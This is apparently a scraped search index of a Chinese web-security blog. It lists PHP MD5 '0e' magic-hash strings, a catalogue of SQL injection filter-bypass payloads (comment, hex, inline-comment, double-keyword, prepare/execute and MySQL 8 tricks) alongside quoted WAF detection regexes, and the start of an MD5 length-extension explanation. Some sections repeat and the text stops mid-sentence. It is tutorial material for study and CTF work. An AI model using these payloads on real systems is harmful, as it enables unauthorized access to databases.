关于PHP hash比较缺陷详细介绍：http://www.freebuf.com/news/67007.html 0x01 md5(str) QNKCDZO 0e830400451993494058024219903391 s878926199a 0e545993274517709034328855841020 s155964671a 0e342768416822451524974117254469 s214587387a 0e848240448830537924465865611904 s214587387a 0e848240448830537924465865611904 s878926199a 0e545993274517709034328855841020 s1091221200a 0e940624217856561557816327384675 s1885207154a 0e509367213418206700842008763514 s1502113478a 0e861580163291561247404381396064 s1885207154a 0e509367213418206700842008763514 s1836677006a 0e481036490867661113260034900752 s155964671a 0e342768416822451524974117254469 s1184209335a 0e072485820392773389523109082030 s1665632922a 0e731198061491163073197128363787 s1502113478a 0e861580163291561247404381396064 s1836677006a 0e481036490867661113260034900752 s1091221200a 0e940624217856561557816327384675 s155964671a 0e342768416822451524974117254469 s1502113478a 0e861580163291561247404381396064 s155964671a 0e342768416822451524974117254469 s1665632922a 0e731198061491163073197128363787 s155964671a 0e342768416822451524974117254469 s1091221200a 0e940624217856561557816327384675 s1836677006a 0e481036490867661113260034900752 s1885207154a 0e509367213418206700842008763514 s532378020a 0e220463095855511507588041205815 s878926199a 0e545993274517709034328855841020 s1091221200a 0e940624217856561557816327384675 s214587387a 0e848240448830537924465865611904 s1502113478a 0e861580163291561247404381396064 s1091221200a 0e940624217856561557816327384675 s1665632922a 0e731198061491163073197128363787 s1885207154a 0e509367213418206700842008763514 s1836677006a 0e481036490867661113260034900752 s1665632922a 0e731198061491163073197128363787 s878926199a 0e545993274517709034328855841020 0x02 md5(md5()) 0x03 md5(md5(str).\"SALT\") 2 0e774261293712168181959463563504","date":"2018-10-14","objectID":"https://zu1k.com/posts/security/web-security/md5-compare-0e/:0:0","series":null,"tags":["MD5","PHP","web-security"],"title":"md5缺陷0e","uri":"https://zu1k.com/posts/security/web-security/md5-compare-0e/#"},{"categories":["web-security"],"content":"在sql注入中经常会遇到服务端针对注入关键字进行过滤，经过查询各种文章，总结了一部分绕过的方法。 2020.08.08更新：增加利用MySQL8.0语法新特性绕过方法，增加sql注入过滤和检测的几种思路和绕过方法 ","date":"2018-10-14","objectID":"https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/:0:0","series":null,"tags":["web-security","SQL注入","Bypass"],"title":"sql注入针对关键字过滤的绕过技巧","uri":"https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/#"},{"categories":["web-security"],"content":"过滤空格 ","date":"2018-10-14","objectID":"https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/:1:0","series":null,"tags":["web-security","SQL注入","Bypass"],"title":"sql注入针对关键字过滤的绕过技巧","uri":"https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/#过滤空格"},{"categories":["web-security"],"content":"使用注释符/**/绕过 SELECT/**/name/**/FROM/**/table ","date":"2018-10-14","objectID":"https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/:1:1","series":null,"tags":["web-security","SQL注入","Bypass"],"title":"sql注入针对关键字过滤的绕过技巧","uri":"https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/#使用注释符绕过"},{"categories":["web-security"],"content":"使用url编码绕过 %a0 发出去就是空格的意思，但是需要在burp中抓包后修改 ","date":"2018-10-14","objectID":"https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/:1:2","series":null,"tags":["web-security","SQL注入","Bypass"],"title":"sql注入针对关键字过滤的绕过技巧","uri":"https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/#使用url编码绕过"},{"categories":["web-security"],"content":"使用浮点数绕过 select * from users where id=8E0union select 1,2,3 等价于 select * from users where id=8.0 select 1,2,3 ","date":"2018-10-14","objectID":"https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/:1:3","series":null,"tags":["web-security","SQL注入","Bypass"],"title":"sql注入针对关键字过滤的绕过技巧","uri":"https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/#使用浮点数绕过"},{"categories":["web-security"],"content":"使用Tab替代空格 ","date":"2018-10-14","objectID":"https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/:1:4","series":null,"tags":["web-security","SQL注入","Bypass"],"title":"sql注入针对关键字过滤的绕过技巧","uri":"https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/#使用tab替代空格"},{"categories":["web-security"],"content":"使用两个空格替代一个空格 ","date":"2018-10-14","objectID":"https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/:1:5","series":null,"tags":["web-security","SQL注入","Bypass"],"title":"sql注入针对关键字过滤的绕过技巧","uri":"https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/#使用两个空格替代一个空格"},{"categories":["web-security"],"content":"使用括号绕过 如果空格被过滤，括号没有被过滤，可以用括号绕过。 在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。 例如： select(user())from dual where(1=1)and(2=2) 这种过滤方法常常用于time based盲注,例如： ?id=1%27and(sleep(ascii(mid(database()from(1)for(1)))=109))%23 ","date":"2018-10-14","objectID":"https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/:1:6","series":null,"tags":["web-security","SQL注入","Bypass"],"title":"sql注入针对关键字过滤的绕过技巧","uri":"https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/#使用括号绕过"},{"categories":["web-security"],"content":"过滤引号 ","date":"2018-10-14","objectID":"https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/:2:0","series":null,"tags":["web-security","SQL注入","Bypass"],"title":"sql注入针对关键字过滤的绕过技巧","uri":"https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/#过滤引号"},{"categories":["web-security"],"content":"使用16进制绕过 会使用到引号的地方一般是在最后的where子句中。如下面的一条sql语句，这条语句就是一个简单的用来查选得到users表中所有字段的一条语句： select column_name from information_schema.tables where table_name=\"users\" 这个时候如果引号被过滤了，那么上面的where子句就无法使用了。那么遇到这样的问题就要使用十六进制来处理这个问题了。 users的十六进制的字符串是7573657273。那么最后的sql语句就变为了： select column_name from information_schema.tables where table_name=0x7573657273 ","date":"2018-10-14","objectID":"https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/:2:1","series":null,"tags":["web-security","SQL注入","Bypass"],"title":"sql注入针对关键字过滤的绕过技巧","uri":"https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/#使用16进制绕过"},{"categories":["web-security"],"content":"过滤逗号 ","date":"2018-10-14","objectID":"https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/:3:0","series":null,"tags":["web-security","SQL注入","Bypass"],"title":"sql注入针对关键字过滤的绕过技巧","uri":"https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/#过滤逗号"},{"categories":["web-security"],"content":"使用from关键字绕过 对于substr()和mid()这两个方法可以使用from to的方式来解决： select substr(database() from 1 for 1); select mid(database() from 1 for 1); ","date":"2018-10-14","objectID":"https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/:3:1","series":null,"tags":["web-security","SQL注入","Bypass"],"title":"sql注入针对关键字过滤的绕过技巧","uri":"https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/#使用from关键字绕过"},{"categories":["web-security"],"content":"使用join关键字绕过 union select 1,2 等价于 union select * from (select 1)a join (select 2)b ","date":"2018-10-14","objectID":"https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/:3:2","series":null,"tags":["web-security","SQL注入","Bypass"],"title":"sql注入针对关键字过滤的绕过技巧","uri":"https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/#使用join关键字绕过"},{"categories":["web-security"],"content":"使用like关键字绕过 select ascii(mid(user(),1,1))=80 #等价于 select user() like 'r%' ","date":"2018-10-14","objectID":"https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/:3:3","series":null,"tags":["web-security","SQL注入","Bypass"],"title":"sql注入针对关键字过滤的绕过技巧","uri":"https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/#使用like关键字绕过"},{"categories":["web-security"],"content":"使用offset关键字绕过 对于limit可以使用offset来绕过： select * from news limit 0,1 等价于 select * from news limit 1 offset 0 ","date":"2018-10-14","objectID":"https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/:3:4","series":null,"tags":["web-security","SQL注入","Bypass"],"title":"sql注入针对关键字过滤的绕过技巧","uri":"https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/#使用offset关键字绕过"},{"categories":["web-security"],"content":"过滤注释符（ # 和 -- ） ","date":"2018-10-14","objectID":"https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/:4:0","series":null,"tags":["web-security","SQL注入","Bypass"],"title":"sql注入针对关键字过滤的绕过技巧","uri":"https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/#过滤注释符--和----"},{"categories":["web-security"],"content":"手动闭合引号，不使用注释符 id=1' union select 1,2,3||'1 或者： id=1' union select 1,2,'3 ","date":"2018-10-14","objectID":"https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/:4:1","series":null,"tags":["web-security","SQL注入","Bypass"],"title":"sql注入针对关键字过滤的绕过技巧","uri":"https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/#手动闭合引号不使用注释符"},{"categories":["web-security"],"content":"过滤比较符号 （ \u003c 和 \u003e ） ","date":"2018-10-14","objectID":"https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/:5:0","series":null,"tags":["web-security","SQL注入","Bypass"],"title":"sql注入针对关键字过滤的绕过技巧","uri":"https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/#过滤比较符号---和--"},{"categories":["web-security"],"content":"使用**greatest()、least（）函数**绕过 greatest()、least（）：（前者返回最大值，后者返回最小值） 同样是在使用盲注的时候，在使用二分查找的时候需要使用到比较操作符来进行查找。如果无法使用比较操作符，那么就需要使用到greatest来进行绕过了 最常见的一个盲注的sql语句： select * from users where id=1 and ascii(substr(database(),0,1))\u003e64 此时如果比较操作符被过滤，上面的盲注语句则无法使用,那么就可以使用greatest来代替比较操作符了。greatest(n1,n2,n3,…)函数返回输入参数(n1,n2,n3,…)的最大值 那么上面的这条sql语句可以使用greatest变为如下的子句: select * from users where id=1 and greatest(ascii(substr(database(),0,1)),64)=64 ","date":"2018-10-14","objectID":"https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/:5:1","series":null,"tags":["web-security","SQL注入","Bypass"],"title":"sql注入针对关键字过滤的绕过技巧","uri":"https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/#使用greatestleast函数绕过"},{"categories":["web-security"],"content":"使用**between and**绕过 between a and b：返回a，b之间的数据，不包含b。 ","date":"2018-10-14","objectID":"https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/:5:2","series":null,"tags":["web-security","SQL注入","Bypass"],"title":"sql注入针对关键字过滤的绕过技巧","uri":"https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/#使用between-and绕过"},{"categories":["web-security"],"content":"过滤等号（ = ） ","date":"2018-10-14","objectID":"https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/:6:0","series":null,"tags":["web-security","SQL注入","Bypass"],"title":"sql注入针对关键字过滤的绕过技巧","uri":"https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/#过滤等号--"},{"categories":["web-security"],"content":"使用like 、rlike 、regexp 或者 使用\u003c 或者 \u003e ","date":"2018-10-14","objectID":"https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/:6:1","series":null,"tags":["web-security","SQL注入","Bypass"],"title":"sql注入针对关键字过滤的绕过技巧","uri":"https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/#使用like-rlike-regexp-或者-使用-或者-"},{"categories":["web-security"],"content":"过滤or and xor not ","date":"2018-10-14","objectID":"https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/:7:0","series":null,"tags":["web-security","SQL注入","Bypass"],"title":"sql注入针对关键字过滤的绕过技巧","uri":"https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/#过滤or-and-xor-not"},{"categories":["web-security"],"content":"使用符号代替 and=`\u0026\u0026` or=`||` xor=`|` not=`!` ","date":"2018-10-14","objectID":"https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/:7:1","series":null,"tags":["web-security","SQL注入","Bypass"],"title":"sql注入针对关键字过滤的绕过技巧","uri":"https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/#使用符号代替"},{"categories":["web-security"],"content":"过滤union，select，where等 ","date":"2018-10-14","objectID":"https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/:8:0","series":null,"tags":["web-security","SQL注入","Bypass"],"title":"sql注入针对关键字过滤的绕过技巧","uri":"https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/#过滤unionselectwhere等"},{"categories":["web-security"],"content":"使用注释符绕过 常用注释符： //、--、/**/、#、--+、---、;、%00、--a 用法： U/**/ NION /**/ SE/**/ LECT /**/user，pwd from user ","date":"2018-10-14","objectID":"https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/:8:1","series":null,"tags":["web-security","SQL注入","Bypass"],"title":"sql注入针对关键字过滤的绕过技巧","uri":"https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/#使用注释符绕过-1"},{"categories":["web-security"],"content":"使用大小写绕过 id=-1'UnIoN/**/SeLeCT ","date":"2018-10-14","objectID":"https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/:8:2","series":null,"tags":["web-security","SQL注入","Bypass"],"title":"sql注入针对关键字过滤的绕过技巧","uri":"https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/#使用大小写绕过"},{"categories":["web-security"],"content":"使用内联注释绕过 id=-1'/*!UnIoN*/ SeLeCT 1,2,concat(/*!table_name*/) FrOM /*information_schema*/.tables /*!WHERE *//*!TaBlE_ScHeMa*/ like database()# ","date":"2018-10-14","objectID":"https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/:8:3","series":null,"tags":["web-security","SQL注入","Bypass"],"title":"sql注入针对关键字过滤的绕过技巧","uri":"https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/#使用内联注释绕过"},{"categories":["web-security"],"content":"使用双关键字绕过（若删除掉第一个匹配的union就能绕过） id=-1'UNIunionONSeLselectECT1,2,3–- ","date":"2018-10-14","objectID":"https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/:8:4","series":null,"tags":["web-security","SQL注入","Bypass"],"title":"sql注入针对关键字过滤的绕过技巧","uri":"https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/#使用双关键字绕过若删除掉第一个匹配的union就能绕过"},{"categories":["web-security"],"content":"使用加号+拆解字符串 or ‘swords’ =‘sw’ +’ ords’ ；EXEC(‘IN’ +’ SERT INTO ‘+’ …..’ ) ","date":"2018-10-14","objectID":"https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/:8:5","series":null,"tags":["web-security","SQL注入","Bypass"],"title":"sql注入针对关键字过滤的绕过技巧","uri":"https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/#使用加号拆解字符串"},{"categories":["web-security"],"content":"使用语法新特性绕过屏蔽select 在MySQL 8.0.19版本后，mysql推出了一些新特性，使我们可以不使用select就能够取数据 TABLE 语句 可以直接列出表的全部内容 TABLE table_name [ORDER BY column_name] [LIMIT number [OFFSET number]] 如 select * from user 就可以用 table user 替代来进行绕过 VALUES 语句 可以列出一行的值 VALUES row_constructor_list [ORDER BY column_designator] [LIMIT BY number] row_constructor_list: ROW(value_list)[, ROW(value_list)][, ...] value_list: value[, value][, ...] column_designator: column_index 例如直接列出一行的值 VALUES ROW(1,2,3), ROW(4,5,6); VALUES和TABLES语句的结果都是表数据，可以结合起来使用 ","date":"2018-10-14","objectID":"https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/:8:6","series":null,"tags":["web-security","SQL注入","Bypass"],"title":"sql注入针对关键字过滤的绕过技巧","uri":"https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/#使用语法新特性绕过屏蔽select"},{"categories":["web-security"],"content":"使用语法新特性绕过屏蔽select 在MySQL 8.0.19版本后，mysql推出了一些新特性，使我们可以不使用select就能够取数据 TABLE 语句 可以直接列出表的全部内容 TABLE table_name [ORDER BY column_name] [LIMIT number [OFFSET number]] 如 select * from user 就可以用 table user 替代来进行绕过 VALUES 语句 可以列出一行的值 VALUES row_constructor_list [ORDER BY column_designator] [LIMIT BY number] row_constructor_list: ROW(value_list)[, ROW(value_list)][, ...] value_list: value[, value][, ...] column_designator: column_index 例如直接列出一行的值 VALUES ROW(1,2,3), ROW(4,5,6); VALUES和TABLES语句的结果都是表数据，可以结合起来使用 ","date":"2018-10-14","objectID":"https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/:8:6","series":null,"tags":["web-security","SQL注入","Bypass"],"title":"sql注入针对关键字过滤的绕过技巧","uri":"https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/#table-语句"},{"categories":["web-security"],"content":"使用语法新特性绕过屏蔽select 在MySQL 8.0.19版本后，mysql推出了一些新特性，使我们可以不使用select就能够取数据 TABLE 语句 可以直接列出表的全部内容 TABLE table_name [ORDER BY column_name] [LIMIT number [OFFSET number]] 如 select * from user 就可以用 table user 替代来进行绕过 VALUES 语句 可以列出一行的值 VALUES row_constructor_list [ORDER BY column_designator] [LIMIT BY number] row_constructor_list: ROW(value_list)[, ROW(value_list)][, ...] value_list: value[, value][, ...] column_designator: column_index 例如直接列出一行的值 VALUES ROW(1,2,3), ROW(4,5,6); VALUES和TABLES语句的结果都是表数据，可以结合起来使用 ","date":"2018-10-14","objectID":"https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/:8:6","series":null,"tags":["web-security","SQL注入","Bypass"],"title":"sql注入针对关键字过滤的绕过技巧","uri":"https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/#values-语句"},{"categories":["web-security"],"content":"使用编码绕过过滤 如URLEncode编码，ASCII,HEX,unicode编码绕过 or 1=1即%6f%72%20%31%3d%31，而Test也可以为CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116) ","date":"2018-10-14","objectID":"https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/:9:0","series":null,"tags":["web-security","SQL注入","Bypass"],"title":"sql注入针对关键字过滤的绕过技巧","uri":"https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/#使用编码绕过过滤"},{"categories":["web-security"],"content":"使用等价函数绕过过滤 hex()、bin() ==\u003e ascii() sleep() ==\u003ebenchmark() concat_ws()==\u003egroup_concat() mid()、substr() ==\u003e substring() @@user ==\u003e user() @@datadir ==\u003e datadir() 举例：substring()和substr()无法使用时：?id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74　或者： substr((select 'password'),1,1) = 0x70 strcmp(left('password',1), 0x69) = 1 strcmp(left('password',1), 0x70) = 0 strcmp(left('password',1), 0x71) = -1 ","date":"2018-10-14","objectID":"https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/:10:0","series":null,"tags":["web-security","SQL注入","Bypass"],"title":"sql注入针对关键字过滤的绕过技巧","uri":"https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/#使用等价函数绕过过滤"},{"categories":["web-security"],"content":"补充：进行过滤的几种思路 ","date":"2018-10-14","objectID":"https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/:11:0","series":null,"tags":["web-security","SQL注入","Bypass"],"title":"sql注入针对关键字过滤的绕过技巧","uri":"https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/#补充进行过滤的几种思路"},{"categories":["web-security"],"content":"黑名单字符替换 这种是最简单的，针对某些黑名单关键字，直接进行 str_replace 如果替换的不完全，可以用 selselectect 来替换 select 绕过 ","date":"2018-10-14","objectID":"https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/:11:1","series":null,"tags":["web-security","SQL注入","Bypass"],"title":"sql注入针对关键字过滤的绕过技巧","uri":"https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/#黑名单字符替换"},{"categories":["web-security"],"content":"正则匹配 在一些waf或者cms会见到类似如下的防护代码 $filter = \"\\\\\u003c.+javascript:window\\\\[.{1}\\\\\\\\x|\u003c.*=(\u0026#\\\\d+?;?)+?\u003e|\u003c.*(data|src)=data:text\\\\/html.*\u003e|\\\\b(alert\\\\(|confi rm\\\\(|expression\\\\(|prompt\\\\(|benchmark\\s*?\\(.*\\)|sleep\\s*?\\(.*\\)|load_file\\s*?\\\\()|\u003c[a-z]+?\\\\b[^\u003e]*?\\\\bon([a-z]{4,}) \\s*?=|^\\\\+\\\\/v(8|9)|\\\\b(and|or)\\\\b\\\\s*?([\\\\(\\\\)'\\\"\\\\d]+?=[\\\\(\\\\)'\\\"\\\\d]+?|[\\\\(\\\\)'\\\"a-zA-Z]+?=[\\\\(\\\\)'\\\"a-zA-Z]+?|\u003e|\u003c |\\s+?[\\\\w]+?\\\\s+?\\\\bin\\\\b\\\\s*?\\(|\\\\blike\\\\b\\\\s+?[\\\"'])|\\\\/\\\\*.*\\\\*\\\\/|\u003c\\\\s*script\\\\b|\\\\bEXEC\\\\b|UNION.+?SELECT(\\(|@{1 ,2}\\w+?\\s*|\\s+?.+?|.*(`|'|\\\").+(`|'|\\\")\\s*)|UPDATE\\s*(\\(.+\\)\\s*|@{1,2}.+?\\s*|\\s+?.+?|(`|'|\\\").*?(`|'|\\\")\\s*)SET|INSER T\\\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM\\s+?|(CREATE|ALTER|DROP|TRUNCATE)\\\\s+(TABLE|DATABASE)|FROM\\s.?|\\(select|\\(\\s select|\\bunion\\b|select\\s.+?\"; 这里面匹配了各种模式的注入语句，但是还是可以绕过的 比如说 INSERT\\\\s+INTO.+?VALUES 可以使用 insert into xxx select 的方式进行绕过 在经过不断的更新换代升级之后，产生了一些非常经典的正则，主要考虑到注入获取数据的时候需要联合查询或者子查询来完成 例如discuz的防护代码 _do_query_safe $_config['security']['querysafe']['dfunction'] = array('load_file','hex','substring','if','ord','char'); $_config['security']['querysafe']['daction'] = array('@','intooutfile','intodumpfile','unionselect','(select', 'un ionall', 'uniondistinct'); $_config['security']['querysafe']['dnote'] = array('/*','*/','#','--','\"'); ... $clean = preg_replace(\"/[^a-z0-9_\\-\\(\\)#\\*\\/\\\"]+/is\", \"\", strtolower($clean)); ... if (is_array(self::$config['dfunction'])) { foreach (self::$config['dfunction'] as $fun) { if (strpos($clean, $fun . '(') !== false) return '-1'; } } 这段代码首先将sql语句除了a-z``0-9和几个有限的字符外的其他所有字符替换为空，然后对其进行匹配，如果能够匹配到类似unionall、(select这样的获取数据所要用到的代码，就拒绝执行 但是即便是这样也还可以绕过，比如同表注入就不需要用到子查询 select * from test where test3=-1 or substr(test2,1,1)=1 或者可以使用多语句的方式执行 set @a:=0x73656c656374202a2066726f6d2074657374; prepare s from @a; execute s; 也可以 handler user open; handler user read first; ","date":"2018-10-14","objectID":"https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/:11:2","series":null,"tags":["web-security","SQL注入","Bypass"],"title":"sql注入针对关键字过滤的绕过技巧","uri":"https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/#正则匹配"},{"categories":["web-security"],"content":"语义分析 这是最高级的方式，模仿mysql对sql的分析，waf对用户的输入进行语法语义分析，如果符合mysql的语法，就判断为sql注入从而阻断 这种防护的绕过思路就是找特殊的语法，这些特殊语法waf可能没有覆盖全面，从而导致waf语义分析失败，从而进行绕过 例如我们上面说的mysql8的tables和values语句就是比较新的语法，有很多waf还米有覆盖到 ","date":"2018-10-14","objectID":"https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/:11:3","series":null,"tags":["web-security","SQL注入","Bypass"],"title":"sql注入针对关键字过滤的绕过技巧","uri":"https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/#语义分析"},{"categories":["cryptography"],"content":"一、遇到的问题 在一道web题目中遇到了以下判断: if ($COOKIE[\"md5hash\"] === md5($secret . $input)) 在该题目中我们可以掌握的参数有md5hash、input的值，secret的md5值和长度，我们需要想办法让这个判断通过。 由此想到了md5的hash长度扩展攻击。 ","date":"2018-10-14","objectID":"https://zu1k.com/posts/security/crypto/md5-hash-length-extension-attack/:1:0","series":null,"tags":["MD5","哈希算法"],"title":"MD5的Hash长度扩展攻击","uri":"https://zu1k.com/posts/security/crypto/md5-hash-length-extension-attack/#一遇到的问题"},{"categories":["cryptography"],"content":"二、md5算法原理 ","date":"2018-10-14","objectID":"https://zu1k.com/posts/security/crypto/md5-hash-length-extension-attack/:2:0","series":null,"tags":["MD5","哈希算法"],"title":"MD5的Hash长度扩展攻击","uri":"https://zu1k.com/posts/security/crypto/md5-hash-length-extension-attack/#二md5算法原理"},{"categories":["cryptography"],"content":"基本介绍 md5是对一段信息（Message）产生信息摘要（Message-Digest），所谓信息就是指我们需要加密的原数据，信息摘要是数据经过一系列计算得出来的一个长度固定的数据（可以说是源数据的一个独一无二的指纹）。 ","date":"2018-10-14","objectID":"https://zu1k.com/posts/security/crypto/md5-hash-length-extension-attack/:2:1","series":null,"tags":["MD5","哈希算法"],"title":"MD5的Hash长度扩展攻击","uri":"https://zu1k.com/posts/security/crypto/md5-hash-length-extension-attack/#基本介绍"},{"categories":["cryptography"],"content":"计算步骤 MD5以512位分组来处理输入的信息，且每一分组又被划分为16个32位子分组，经过了一系列的处理后，算法的输出由四个32位分组组成，将这四个32位分组级联后将生成一个128位散列值。 第一步、填充 如果输入信息的长度(bit)对512求余的结果不等于448，就需要填充使得对512求余的结果等于448。填充的方法是填充一个1和n个0。填充完后，信息的长度就为N*512+448(bit)； 第二步、记录信息长度 用64位来存储填充前信息长度。这64位加在第一步结果的后面，这样信息长度就变为N*512+448+64=(N+1)*512位。 第三步、装入标准的幻数（四个整数） 标准的幻数（物理顺序）是 （A=(01234567)16，B=(89ABCDEF)16，C=(FEDCBA98)16，D=(76543210)16）。如果在程序中定义应该是（A=0X67452301L，B=0XEFCDAB89L，C=0X98BADCFEL，D=0X10325476L） 标准的初幻数是Md5算法固定的，不会变化，但是幻数本身是随着每一轮计算不断变动的。 第四步、四轮循环运算 复杂运算，具体计算方法可以google一下代码。 ","date":"2018-10-14","objectID":"https://zu1k.com/posts/security/crypto/md5-hash-length-extension-attack/:2:2","series":null,"tags":["MD5","哈希算法"],"title":"MD5的Hash长度扩展攻击","uri":"https://zu1k.com/posts/security/crypto/md5-hash-length-extension-attack/#计算步骤"},{"categories":["cryptography"],"content":"计算步骤 MD5以512位分组来处理输入的信息，且每一分组又被划分为16个32位子分组，经过了一系列的处理后，算法的输出由四个32位分组组成，将这四个32位分组级联后将生成一个128位散列值。 第一步、填充 如果输入信息的长度(bit)对512求余的结果不等于448，就需要填充使得对512求余的结果等于448。填充的方法是填充一个1和n个0。填充完后，信息的长度就为N*512+448(bit)； 第二步、记录信息长度 用64位来存储填充前信息长度。这64位加在第一步结果的后面，这样信息长度就变为N*512+448+64=(N+1)*512位。 第三步、装入标准的幻数（四个整数） 标准的幻数（物理顺序）是 （A=(01234567)16，B=(89ABCDEF)16，C=(FEDCBA98)16，D=(76543210)16）。如果在程序中定义应该是（A=0X67452301L，B=0XEFCDAB89L，C=0X98BADCFEL，D=0X10325476L） 标准的初幻数是Md5算法固定的，不会变化，但是幻数本身是随着每一轮计算不断变动的。 第四步、四轮循环运算 复杂运算，具体计算方法可以google一下代码。 ","date":"2018-10-14","objectID":"https://zu1k.com/posts/security/crypto/md5-hash-length-extension-attack/:2:2","series":null,"tags":["MD5","哈希算法"],"title":"MD5的Hash长度扩展攻击","uri":"https://zu1k.com/posts/security/crypto/md5-hash-length-extension-attack/#第一步填充"},{"categories":["cryptography"],"content":"计算步骤 MD5以512位分组来处理输入的信息，且每一分组又被划分为16个32位子分组，经过了一系列的处理后，算法的输出由四个32位分组组成，将这四个32位分组级联后将生成一个128位散列值。 第一步、填充 如果输入信息的长度(bit)对512求余的结果不等于448，就需要填充使得对512求余的结果等于448。填充的方法是填充一个1和n个0。填充完后，信息的长度就为N*512+448(bit)； 第二步、记录信息长度 用64位来存储填充前信息长度。这64位加在第一步结果的后面，这样信息长度就变为N*512+448+64=(N+1)*512位。 第三步、装入标准的幻数（四个整数） 标准的幻数（物理顺序）是 